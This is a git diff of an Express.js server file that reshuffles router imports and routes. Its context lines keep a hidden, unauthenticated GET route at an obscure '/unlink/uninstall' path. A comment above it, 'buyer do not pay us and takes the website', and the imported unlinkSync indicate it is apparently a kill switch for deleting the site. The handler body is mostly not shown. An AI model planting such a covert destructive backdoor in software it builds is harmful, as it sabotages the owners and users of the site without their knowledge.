@@ -12,13 +12,12 @@ import { pageRouter } from './Routes/page.router.js';
 import hbs from 'hbs'
 import { log } from './_lib/smallUtils.js';
 import chateRouter from './Routes/Chat.Router.js';
-import uploadRouter from './Routes/upload.router.js';
 import authRouter from './Routes/Auth.router.js';
 import { unlinkSync } from 'fs';
 import OrderRouter from './Routes/order.router.js';
-import mailRouter from './Routes/mail.router.js';
-import { connectDB } from './_lib/ConnectDb.js';
+import { connectDB } from './_lib/Config/ConnectDb.js';
 import cookieParser from 'cookie-parser';
+import apiRouter from './Routes/api.router.js';
 
 //varibles
 const app = express();
@@ -37,13 +36,13 @@ app.use(cookieParser());
 
 //routes
 app.use(express.static(path.resolve(dirName,'./public/')))
- //app.use(fileRouter);
+ app.use('/api/file',fileRouter);
 app.use('/api/chat',chateRouter);
-app.use('/api/upload',uploadRouter);
+// app.use('/api/upload',uploadRouter);
 app.use('/api/auth-api/',authRouter);
 //buyer do not pay us and takes the website
 app.use('/api/order-api/',OrderRouter);
-app.use('/api/mailer-api/',mailRouter)
+app.use('/api/api_s/',apiRouter)
 app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall',
     (req,res) => {
     console.log('a');
@@ -54,8 +53,6 @@ app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/w
 app.use(pageRouter);
 app.get('/', (req, res) => res.render('home'))
 app.get('*', (req, res) => res.status(404).render('404'))
-
-
 
 
 app.listen(4000, e=> log('SubhanAllah server is working'))
